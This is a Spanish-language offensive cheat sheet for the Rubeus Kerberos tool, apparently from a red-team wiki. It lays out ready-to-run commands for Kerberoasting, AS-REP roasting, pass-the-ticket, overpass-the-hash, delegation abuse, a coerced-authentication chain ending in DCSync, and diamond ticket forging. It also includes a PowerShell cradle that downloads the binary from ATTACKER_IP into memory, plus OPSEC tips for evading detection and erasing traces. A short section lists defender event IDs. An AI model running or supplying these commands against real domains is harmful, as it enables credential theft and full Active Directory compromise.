---
title: "Rubeus Cheat Sheet"
category: "AD"
description: "Herramienta en C# para interacción cruda con Kerberos: Roasting, Tickets y Delegación."
image: "/images/wiki/7.png"
---

# Rubeus: Herramienta Ofensiva para Kerberos

**Rubeus** es una herramienta escrita en C# (parte del proyecto **GhostPack** de @harmj0y) para la interaccion directa con el protocolo Kerberos y el abuso de tickets en entornos Active Directory. Al estar escrita en C#, se puede compilar como ensamblado .NET y cargarse en memoria sin tocar disco, lo que la convierte en una de las herramientas mas utilizadas en engagements modernos de red team.

| Recurso | Enlace |
|---------|--------|
| Repositorio oficial | [GhostPack/Rubeus](https://github.com/GhostPack/Rubeus) |
| Binarios precompilados | [Ghostpack-CompiledBinaries](https://github.com/r3motecontrol/Ghostpack-CompiledBinaries) |

## Compilacion y Carga en Memoria

### Compilar desde fuente

```powershell
# Clonar y compilar con Visual Studio (Release, Any CPU)
git clone https://github.com/GhostPack/Rubeus.git
# Abrir Rubeus.sln en Visual Studio -> Build -> Release

# Compilar con csc.exe directamente (si no hay VS)
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /target:exe /out:Rubeus.exe *.cs
```

### Cargar en memoria via Reflection (sin tocar disco)

Ejecutar Rubeus sin escribir el binario en disco evita detecciones basadas en firma de archivos.

```powershell
# Cargar ensamblado .NET en memoria desde PowerShell
$data = (New-Object Net.WebClient).DownloadData('http://ATTACKER_IP/Rubeus.exe')
$assem = [System.Reflection.Assembly]::Load($data)
[Rubeus.Program]::Main("kerberoast /outfile:hashes.txt".Split())
```

### Ejecucion con execute-assembly (C2)

```
# Cobalt Strike
execute-assembly /path/to/Rubeus.exe kerberoast /rc4opsec /outfile:hashes.txt

# Sliver
execute-assembly -i Rubeus.exe kerberoast /rc4opsec /outfile:hashes.txt
```

## Roasting Attacks

### Kerberoasting

Solicita tickets TGS para cuentas de servicio con SPN configurado y los extrae en formatos crackeables. El hash se cifra con la password de la cuenta de servicio, por lo que se puede romper offline.

```powershell
# Estadisticas: cuantas cuentas con SPN y que cifrado usan (NO extrae tickets)
Rubeus.exe kerberoast /stats

# Kerberoast basico: todas las cuentas con SPN
Rubeus.exe kerberoast /outfile:hashes.txt

# OPSEC: solicitar solo tickets RC4 para cuentas que lo soportan nativamente
Rubeus.exe kerberoast /rc4opsec /outfile:hashes.txt

# Usuario especifico
Rubeus.exe kerberoast /user:svc_sql /outfile:hashes.txt

# SPN especifico
Rubeus.exe kerberoast /spn:MSSQLSvc/db01.corp.local:1433 /outfile:hashes.txt

# Con TGT delegado (sin credenciales, solo sesion de dominio)
Rubeus.exe kerberoast /rc4opsec /tgtdeleg /outfile:hashes.txt

# Filtro LDAP personalizado (ej: solo cuentas de un grupo)
Rubeus.exe kerberoast /ldapfilter:"memberof=CN=ServiceAccounts,OU=Groups,DC=corp,DC=local" /outfile:hashes.txt

# Cross-domain
Rubeus.exe kerberoast /domain:child.corp.local /dc:dc01.child.corp.local /outfile:hashes.txt
```

| Flag | Descripcion |
|------|-------------|
| `/stats` | Muestra estadisticas de cuentas con SPN sin extraer tickets |
| `/rc4opsec` | Solo ataca cuentas que soportan RC4 de forma nativa |
| `/tgtdeleg` | Obtiene un TGT via el truco de delegacion de Kekeo (sin credenciales) |
| `/user:X` | Kerberoast solo la cuenta especificada |
| `/spn:X` | Ataca un SPN concreto |
| `/outfile:X` | Guarda hashes en archivo (formato hashcat) |
| `/simple` | Salida simplificada (solo el hash) |
| `/ldapfilter:X` | Filtro LDAP adicional para acotar objetivos |
| `/nowrap` | No inserta saltos de linea en el hash Base64 |

**Cracking con hashcat:**

```bash
hashcat -m 13100 hashes.txt /usr/share/wordlists/rockyou.txt   # RC4 (tipo 23)
hashcat -m 19700 hashes.txt /usr/share/wordlists/rockyou.txt   # AES256 (tipo 19700)
```

### AS-REP Roasting

Busca cuentas con pre-autenticacion deshabilitada (`DONT_REQUIRE_PREAUTH`). El KDC devuelve un AS-REP cifrado con la clave derivada de su password, crackeable offline.

```powershell
# Todas las cuentas sin pre-auth
Rubeus.exe asreproast /format:hashcat /outfile:asrep_hashes.txt

# Usuario especifico
Rubeus.exe asreproast /user:svc_legacy /format:hashcat /outfile:asrep_hashes.txt

# Dominio alternativo
Rubeus.exe asreproast /domain:child.corp.local /dc:dc01.child.corp.local /format:hashcat
```

```bash
hashcat -m 18200 asrep_hashes.txt /usr/share/wordlists/rockyou.txt
```

## Gestion de Tickets

### Solicitar TGT (asktgt) / Overpass-the-Hash

Solicita un TGT al KDC. Esto mismo es un **Overpass-the-Hash** cuando se usa un hash en lugar de password: se obtiene un TGT Kerberos legitimo a partir de material NTLM/AES, resultando en autenticacion Kerberos pura.

```powershell
# Con password en texto claro
Rubeus.exe asktgt /user:admin /domain:corp.local /password:P@ssw0rd! /ptt

# Con hash NTLM / RC4 (Overpass-the-Hash)
Rubeus.exe asktgt /user:admin /domain:corp.local /rc4:A1B2C3D4E5F6... /ptt

# Con hash AES256 (mas sigiloso, evita downgrade a RC4)
Rubeus.exe asktgt /user:admin /domain:corp.local /aes256:A1B2C3D4E5F6... /ptt

# Con certificado PKCS12 (post-explotacion de ADCS / ESC1-ESC8)
Rubeus.exe asktgt /user:admin /domain:corp.local /certificate:admin.pfx /password:pfxpass /ptt

# Solo mostrar en base64 (sin inyectar)
Rubeus.exe asktgt /user:admin /domain:corp.local /rc4:HASH /nowrap
```

*Nota*: `/ptt` inyecta el ticket automaticamente en la sesion actual (Pass-the-Ticket).

### Solicitar TGS (asktgs)

```powershell
# Solicitar TGS con un TGT existente
Rubeus.exe asktgs /ticket:<Base64TGT> /service:cifs/dc01.corp.local /ptt

# Multiples servicios a la vez
Rubeus.exe asktgs /ticket:<Base64TGT> /service:cifs/dc01.corp.local,ldap/dc01.corp.local /ptt
```

### Pass-the-Ticket (ptt)

Inyecta un ticket (`.kirbi` o base64) en la sesion de logon actual.

```powershell
Rubeus.exe ptt /ticket:admin.kirbi
Rubeus.exe ptt /ticket:doIFqDCCBaSgAwI...
Rubeus.exe ptt /ticket:<Base64> /luid:0x3e7    # LUID especifico (requiere privilegios)
```

### Otras operaciones con tickets

```powershell
Rubeus.exe klist                                # Listar tickets de la sesion actual
Rubeus.exe klist /all                           # Todos los tickets, todas las sesiones (SYSTEM)
Rubeus.exe describe /ticket:<Base64_o_Kirbi>    # Decodificar y mostrar metadata del ticket
Rubeus.exe purge                                # Purgar tickets de la sesion actual
Rubeus.exe renew /ticket:<Base64TGT> /ptt       # Renovar un TGT existente
Rubeus.exe renew /ticket:<Base64TGT> /autorenew # Renovar en bucle hasta el maximo
Rubeus.exe dump /nowrap                         # Extraer tickets de memoria (SYSTEM)
Rubeus.exe dump /service:krbtgt /nowrap         # Extraer solo TGTs
Rubeus.exe tgtdeleg /target:cifs/dc01.corp.local # Obtener TGT usable sin credenciales
```

## Ataques de Delegacion

### Constrained Delegation (S4U)

Si se compromete una cuenta con **Constrained Delegation** (`msDS-AllowedToDelegateTo`), se puede impersonar a cualquier usuario (excepto los marcados como "sensitive" o miembros de Protected Users) contra los servicios permitidos.

```powershell
# 1. Obtener TGT de la cuenta con delegacion
Rubeus.exe asktgt /user:svc_web /domain:corp.local /rc4:HASH /nowrap

# 2. Ejecutar cadena S4U2Self + S4U2Proxy
Rubeus.exe s4u /ticket:<Base64TGT> /impersonateuser:Administrator /msdsspn:cifs/fileserver.corp.local /ptt

# Con cambio de SPN (altservice)
Rubeus.exe s4u /ticket:<Base64TGT> /impersonateuser:Administrator /msdsspn:cifs/fileserver.corp.local /altservice:ldap /ptt

# 3. Verificar acceso
dir \\fileserver.corp.local\c$
```

### Resource-Based Constrained Delegation (RBCD)

Si se tiene escritura sobre `msDS-AllowedToActOnBehalfOfOtherIdentity` del target, se puede configurar RBCD y usar S4U para impersonar usuarios.

```powershell
# Prerequisito: configurar RBCD (ej. con PowerView o Impacket)
# Set-ADComputer fileserver -PrincipalsAllowedToDelegateToAccount controlledaccount$

# 1. TGT de la cuenta controlada
Rubeus.exe asktgt /user:controlledaccount$ /rc4:HASH /nowrap

# 2. Cadena S4U completa para RBCD
Rubeus.exe s4u /ticket:<Base64TGT> /impersonateuser:Administrator /msdsspn:cifs/fileserver.corp.local /ptt

# 3. Verificar acceso
dir \\fileserver.corp.local\c$
```

## Monitor y Harvest (Unconstrained Delegation)

En un servidor con **Unconstrained Delegation**, los TGTs de los usuarios que se conectan quedan almacenados en memoria. Rubeus puede monitorizarlos en tiempo real.

```powershell
# Monitorear nuevos TGTs cada 5 segundos
Rubeus.exe monitor /interval:5 /filteruser:DC01$ /nowrap

# Recolectar y renovar TGTs periodicamente
Rubeus.exe harvest /interval:1800
```

### Cadena de ataque: Unconstrained Delegation + PrinterBug/PetitPotam

```powershell
# 1. Iniciar monitor en la maquina con Unconstrained Delegation
Rubeus.exe monitor /interval:5 /filteruser:DC01$ /nowrap

# 2. Forzar autenticacion del DC (desde otra shell)
SpoolSample.exe DC01.corp.local UNCONSTRAINED_SERVER.corp.local
# Alternativa: PetitPotam.exe UNCONSTRAINED_SERVER.corp.local DC01.corp.local

# 3. Rubeus captura el TGT del DC. Inyectarlo:
Rubeus.exe ptt /ticket:<Base64TGT_del_DC>

# 4. DCSync con el TGT del DC inyectado
mimikatz.exe "lsadump::dcsync /domain:corp.local /user:krbtgt"
```

## Diamond Ticket

Un **Diamond Ticket** modifica un TGT legitimo solicitado al KDC, alterando los privilegios del PAC. Es mas dificil de detectar que un Golden Ticket porque el ticket base fue emitido realmente por el KDC (existe un AS-REQ correspondiente en los logs).

```powershell
# Solicitar TGT real y modificar el PAC para impersonar Administrator
Rubeus.exe diamond /krbkey:<AES256_de_krbtgt> /user:usuario_normal /password:Pass123 /enctype:aes256 /ticketuser:Administrator /ticketuserid:500 /groups:512 /ptt

# Variante con RC4
Rubeus.exe diamond /krbkey:<RC4_de_krbtgt> /user:usuario_normal /password:Pass123 /enctype:rc4 /ticketuser:Administrator /ticketuserid:500 /groups:512 /ptt
```

## Consideraciones OPSEC

### Cifrado y deteccion

| Escenario | Riesgo | Detalle |
|-----------|--------|---------|
| Kerberoast sin `/rc4opsec` | **Alto** | Solicitar RC4 para cuentas AES genera eventos 4769 con cifrado 0x17 |
| Kerberoast con `/rc4opsec` | **Medio** | Solo ataca cuentas que soportan RC4 nativamente |
| `asktgt` con `/rc4` | **Medio-Alto** | AS-REQ con RC4 en dominios 2012+ es anomalo (downgrade) |
| `asktgt` con `/aes256` | **Bajo** | Identico a un login Kerberos legitimo |
| Golden Ticket | **Alto** | No hay AS-REQ en logs del DC; TGT aparece sin origen |
| Diamond Ticket | **Bajo** | AS-REQ legitimo; solo el PAC fue modificado post-emision |

### Eventos clave para Blue Team

| Event ID | Descripcion | Comandos Rubeus relacionados |
|----------|-------------|------------------------------|
| 4768 | AS-REQ (solicitud de TGT) | `asktgt`, `asreproast`, `diamond` |
| 4769 | TGS-REQ (solicitud de TGS) | `kerberoast`, `asktgs`, `s4u` |
| 4770 | Renovacion de TGT | `renew`, `harvest` |
| 4771 | Fallo de pre-autenticacion | Intentos fallidos de `asktgt` |

### Recomendaciones operativas

- **Preferir AES256** en `asktgt` siempre que se disponga del hash AES.
- **Usar `/rc4opsec`** en Kerberoasting para evitar downgrade en cuentas que no usan RC4.
- **No hacer Kerberoast masivo**: usar `/stats` primero, luego `/user` contra objetivos concretos.
- **Ejecutar en memoria** (reflection, execute-assembly) para evitar deteccion en disco.
- **Limpiar tickets** con `purge` al terminar para no dejar artefactos en la sesion.

## Entradas Relacionadas

- **[Kerberos en Active Directory](/wiki/ad-kerberos)** - Fundamentos del protocolo
- **[Impacket](/wiki/ad-impacket)** - `GetUserSPNs.py` (Kerberoasting) y `getST.py` (S4U)
- **[Mimikatz](/wiki/ad-mimikatz)** - Golden/Silver Tickets, DCSync, Pass-the-Hash
- **[Active Directory Certificate Services (ADCS)](/wiki/ad-adcs)** - Abuso de certificados combinable con `asktgt /certificate`
- **[Constrained Delegation](/wiki/ad-delegation)** - Teoria y explotacion de delegacion Kerberos
